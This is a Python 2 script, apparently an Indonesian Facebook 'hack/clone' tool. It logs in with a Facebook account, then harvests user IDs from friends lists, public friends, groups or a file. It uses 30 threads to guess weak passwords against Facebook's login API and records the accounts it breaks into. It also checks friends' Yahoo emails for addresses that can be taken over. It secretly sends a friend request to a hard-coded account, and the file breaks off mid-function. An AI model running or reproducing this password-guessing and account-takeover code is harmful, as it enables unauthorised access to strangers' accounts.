#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\033[1;91m[!] \x1b[1;97mExit Tool"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)


##### LOGO #####
logo = """
\033[1;35m█████████
\033[1;36m█▄█████▄█      \033[1;32m«----------✧----------»
\033[1;33m█\033[1;92m▼▼▼▼▼ \033[1;92m- _ --_--\033[1;31m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗
\033[1;36m█ \033[1;92m \033[1;92m_-_-- -_ --__\033[1;93m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗
\033[1;37m█\033[1;92m▲▲▲▲▲\033[1;92m--  - _ --\033[1;96m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ \033[1;96 ELITE v1.4
\033[1;31m█████████      \033[1;92m«----------✧----------»
\033[1;32m ██ ██
\033[1;37m╔═══════════════════════════════════════════════════╗
\033[1;37m║\033[1;96m* \033[1;93mCreator  \033[1;93m:\033[1;36mANBIA\033[1;93m                            \033[1;36m      ║
\033[1;37m║\033[1;96m* \033[1;93mYoutube \033[1;93m :\033[1;37m\033[4mSANSBAE\033[0m\033[1;93m \033[1;36m                               ║
\033[1;37m║\033[1;96m* \033[1;97mGitHub   \033[1;93m:\033[1;32mhttps://github.com/pematang  \033[1;36m           ║
\033[1;37m╚═══════════════════════════════════════════════════╝"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[●] \x1b[1;92mSedang Masuk Silahkan Menunggu \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print """\033[1;97m=====================================================>\033[1;91mTools Ini Dibuat Hanya Untuk Edukasi Dan Keperluan Penting
\033[1;97m=====================================================>============>
\033[1;91m [¤]   _____         _   _  _____ ____          ______ 
\033[1;91m [¤]  / ____|  /\   | \ | |/ ____|  _ \   /\   |  ____|
\033[1;91m [¤] | (___   /  \  |  \| | (___ | |_) | /  \  | |__   
\033[1;91m [¤]  \___ \ / /\ \ | . ` |\___ \|  _ < / /\ \ |  __|  
\033[1;91m [¤]  ____) / ____ \| |\  |____) | |_) / ____ \| |____ 
\033[1;91m [¤] |_____/_/    \_\_| \_|_____/|____/_/    \_\______|"""
print "\x1b[1;97m=====================================================>●⚀◇-------------------------------------------------◇⚀●⚀●=========>"


CorrectUsername = "FANDY"
CorrectPassword = "PEMATANG"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;91m[☆] \x1b[1;94mUSERNAME TOOLS INI \x1b[1;97m: ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;91m[☆] \x1b[1;97mPASSWORD TOOLS INI \x1b[1;91m: ")
        if (password == CorrectPassword):
            print "Login Berhasil Sobat " + username
            loop = 'false'
        else:
            print "PASSWORD SALAH WOI!"
            os.system('xdg-open https://www.youtube.com/c/FANDY GAMING')

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		print('\033[1;97m[☆] \x1b[1;96mLOGIN MENGGUNAKAN AKUN PALSU ANDA \x1b[1;97m[☆]' )
		id = raw_input('\033[1;96m[+] \x1b[1;33mUsername FB \x1b[1;91m: \x1b[1;92m')
		pwd = raw_input('\x1b[1;91m[+] \x1b[1;37mPassword FB \x1b[1;91m: \x1b[1;92m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;97m[!] \x1b[1;91mNo Net Connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\033[1;96m[✓] \x1b[1;92mLogin successful'
				os.system('xdg-open https://www.youtube.com/c/SANSBAE')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;96m[!] \x1b[1;91mNo Net Connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;96m[!] \x1b[1;91mSorry your Account on Check point")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;96m[!] \x1b[1;91mLogin Failed")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;96m[!] \033[1;91mSorry your Account on Check point"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;96m[!] \x1b[1;91mNo Net Connection"
		keluar()
	os.system("clear")
	print logo
	print 42*"\033[1;96m="
	print "\033[1;96m[\033[1;92m✓\033[1;96m]\033[1;35m Name \033[1;91m: \033[1;32m"+nama+"\033[1;97m               "
	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;34m ID   \033[1;91m: \033[1;32m"+id+"\x1b[1;97m              "
	print 42*"\033[1;96m="
	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;37m Hack Facebook Coeg"
	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;36m Lihat Daftar Grup               "
	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;33m Yahoo id clone               "
	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m LogOut            "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
	if unikers =="":
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		grupsaya()
	elif unikers =="3":
		yahoo()
	elif unikers =="0":
		jalan('Remove token successful')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;37m Hack Dari Daftar Teman"
	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;36m Hack Dari Teman Public"
	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;35m Hack Dari Grup"
	print "\x1b[1;96m[\x1b[1;92m4\x1b[1;96m]\x1b[1;93m Hack Dari File (buat wordlist anda)"
	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Kembali"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;97m >>> \033[1;97m")
	if peak =="":
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		jalan('\033[1;96m[✺]\033[1;37mScanning ID Teman \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		idt = raw_input("\033[1;96m[+] \033[1;37mMasukkan ID Teman Kamu \033[1;91m: \033[1;32m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;36mFriend's name       \033[1;91m :\033[1;32m "+op["name"]
		except KeyError:
			print"\033[1;96m[!] \x1b[1;91mFriends not found!"
			raw_input("\n\033[1;97m[\033[1;91mEnter Back\033[1;97m]")
			super()
		jalan('\033[1;35m[✺] \033[1;35mMohon Tunggu Mengambil ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		idg=raw_input('\033[1;96m[+] \033[1;37mMasukkan ID Grup \033[1;91m:\033[1;32m ')
		try:
			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+toket)
			asw=json.loads(r.text)
			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;36mNama grup     \033[1;91m:\033[1;32m "+asw['name']
		except KeyError:
			print"\033[1;96m[!] \x1b[1;91mGroup not found"
			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
			super()
		jalan('\033[1;96m[✺] \033[1;93mMohon Tunggu Mengambil ID \033[1;97m...')
		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=999999999&access_token='+toket)
		s=json.loads(re.text)
		for p in s['data']:
			id.append(p['id'])
	elif peak =="4":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		try:
			idlist = raw_input('\x1b[1;96m[+] \x1b[1;37mMasukkan Nama File  \x1b[1;91m: \x1b[1;97m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '\x1b[1;96m[!] \x1b[1;91mFile not found'
			raw_input('\n\x1b[1;96m[ \x1b[1;97mEnter Back \x1b[1;96m]')
			super()
	elif peak =="0":
		menu()
	else:
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih_super()
	
	print "\033[1;96m[+] \033[1;36mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
	jalan('\033[1;32m[✺] \033[1;32mGasskeun Fandy \033[1;97m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;93mHacking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print
	print('\x1b[1;31m[!] \x1b[1;31mStop CTRL+z')
	print 42*"\033[1;96m="
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
					cek = open("out/super_cp.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name']+'123456'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
							cek = open("out/super_cp.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['last_name'] + '12'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
									cek = open("out/super_cp.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = 'bangsad'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
											cek = open("out/super_cp.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = 'memek'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
													cek = open("out/super_cp.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = 'pulber'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
															cek = open("out/super_cp.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = 'indonesia'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
																	cek = open("out/super_cp.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;96m="
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSuccessful \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mYour CP File Saved \033[1;91m: \033[1;97mout/super_cp.txt")
	raw_input("\n\033[1;96m[\033[1;97mEnter Back\033[1;96m]")
	super()


def grupsaya():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken tidak ditemukan"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	try:
		uh = requests.get('https://graph.facebook.com/me/groups?access_token='+toket)
		gud = json.loads(uh.text)
		for p in gud['data']:
			nama = p["name"]
			id = p["id"]
			f=open('out/Grupid.txt','w')
			listgrup.append(id)
			f.write(id + '\n')
			print "\033[1;96m[\033[1;92mGroup\033[1;96m]\x1b[1;97m "+str(id)+" \x1b[1;96m=>\x1b[1;97m "+str(nama)
		print 42*"\033[1;96m="
		print"\033[1;96m[+] \033[1;92mTotal Group \033[1;91m:\033[1;97m %s"%(len(listgrup))
		print("\033[1;96m[+] \033[1;92mTersimpan \033[1;91m: \033[1;97mout/Grupid.txt")
		f.close()
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;96m[!] \x1b[1;91mTerhenti")
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()
	except KeyError:
		os.remove('out/Grupid.txt')
		print('\033[1;96m[!] \x1b[1;91mGroup tidak ditemukan')
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()
	except requests.exceptions.ConnectionError:
		print"\033[1;96m[✖] \x1b[1;91mTidak ada koneksi"
		keluar()
	except IOError:
		print "\033[1;96m[!] \x1b[1;91mError"
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()


def yahoo():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;37m Clone dari daftar teman"
	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;36m Clone dari teman public"
	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;35m Clone dari grup"
	print "\x1b[1;96m[\x1b[1;92m4\x1b[1;96m]\x1b[1;93m Clone dari file"
	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Kembali"
	clone()
       
def clone():
	embuh = raw_input("\n\x1b[1;97m >>> ")
	if embuh =="":
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
	elif embuh =="1":
		clone_dari_daftar_teman()
	elif embuh =="2":
		clone_dari_teman()
	elif embuh =="3":
		clone_dari_member_group()
	elif embuh =="4":
		clone_dari_file()
	elif embuh =="0":
		menu()
	else:
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		

def clone_dari_daftar_teman():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token Invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	mpsh = []
	jml = 0
	print 42*"\033[1;96m="
	jalan('\033[1;96m[\x1b[1;97m✺\x1b[1;96m] \033[1;37mTake email \033[1;97m...')
	teman = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
	kimak = json.loads(teman.text)
	save = open('out/MailVuln.txt','w')
	jalan('\033[1;96m[\x1b[1;32m✺\x1b[1;96m] \033[1;32mStart \033[1;97m...')
	print ('\x1b[1;96m[!] \x1b[1;31mStop CTRL+z')
	print 42*"\033[1;97m="
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					save.write("Nama: "+ nama +"ID :" + id +"Email: "+ mail + '\n')
					print("\033[1;37m[\033[1;92mVuln\033[1;37m] \033[1;92m" +mail+" \033[1;96m[\x1b[1;97m"+nama)
					berhasil.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;96m="
	print '\033[1;9m[\033[1;97m✓\033[1;96m] \033[1;92mSuccessful \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;96m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/MailVuln.txt"
	save.close()
	raw_input("\n\033[1;96m[\033[1;97mEnter Back\033[1;96m]")
	menu()


def clone_dari_teman():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	mpsh = []
	jml = 0
	print 42*"\033[1;96m="
	idt = raw_input("\033[1;96m[+] \033[1;37mEnter friend ID \033[1;91m: \033[1;32m")
	try:
		jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
		op = json.loads(jok.text)
		print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mFB Name        \033[1;91m :\033[1;32m "+op["name"]
	except KeyError:
		print"\033[1;96m[!] \x1b[1;91mTeman tidak ditemukan"
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()
	jalan('\033[1;96m[✺] \033[1;36mTake email \033[1;97m...')
	teman = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
	kimak = json.loads(teman.text)
	save = open('out/TemanMailVuln.txt','w')
	jalan('\033[1;32m[✺] \033[1;32mStart \033[1;97m...')
	print('\x1b[1;96m[!] \x1b[1;91mStop CTRL+z')
	print 43*"\033[1;97m="
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					save.write("Nama: "+ nama +"ID :" + id +"Email: "+ mail + '\n')
					print("\033[1;96m[\033[1;92mVULN✓\033[1;96m] \033[1;92m" +mail+" \033[1;96m=>\x1b[1;97m"+nama)
					berhasil.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;96m="
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSuccessful \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;96m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/TemanMailVuln.txt"
	save.close()
	raw_input("\n\033[1;96m[\033[1;97mEnter Back\033[1;96m]")
	menu()
	
def clone_dari_member_group():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	mpsh = []
	jml = 0
	print 42*"\033[1;96m="
	id=raw_input('\033[1;96m[+] \033[1;37mEnter group ID \033[1;91m:\033[1;92m ')
	try:
		r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
		asw=json.loads(r.text)
		print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;96mName group     \033[1;91m:\033[1;92m "+asw['name']
	except KeyError:
		print"\033[1;96m[!] \x1b[1;91mGroup not found"
		raw_input("\n\033[1;96m[\033[1;97mEnter Back\033[1;96m]")
		menu()
	jalan('\033[1;96m[✺] \033[1;93mTake email \033[1;97m...')
	teman = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
	kimak = json.loads(teman.text)
	save = open('out/GrupMailVuln.txt','w')
	jalan('\033[1;92m[✺] \033[1;92mStart \033[1;97m...')
	print('\x1b[1;96m[!] \x1b[1;91mStop CTRL+z')
	print 42*"\033[1;97m="
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					save.write("Nama: "+ nama +"ID :" + id +"Email: "+ mail + '\n')
					print("\033[1;96m[\033[1;97mVULN✓\033[1;96m] \033[1;92m" +mail+" \033[1;96m=>\x1b[1;97m"+nama)
					berhasil.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;96m="
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;96m[+] \033[1;92mFile tersimpan \033[1;91m:\033[1;97m out/GrupMailVuln.txt"
	save.close()
	raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
	menu()


def clone_dari_file():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
